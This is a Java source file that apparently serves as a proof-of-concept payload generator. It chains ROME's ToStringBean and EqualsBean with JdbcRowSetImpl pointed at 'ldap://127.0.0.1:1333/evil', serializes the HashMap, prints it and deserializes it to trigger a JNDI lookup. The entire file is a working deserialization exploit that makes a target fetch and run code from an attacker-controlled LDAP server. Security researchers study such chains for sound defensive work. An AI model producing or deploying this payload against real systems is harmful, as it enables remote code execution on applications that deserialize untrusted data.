package com.example;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.util.HashMap;
import java.util.Vector;

public class JdbcRowSetImplChain {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://127.0.0.1:1333/evil";
        jdbcRowSet.setDataSourceName(url);


        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "0w0");

        Vector<String> strMatchColumns = new Vector<>();
        strMatchColumns.add("username");
        Utils.SetValue(jdbcRowSet,"strMatchColumns" ,strMatchColumns);

        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }
}
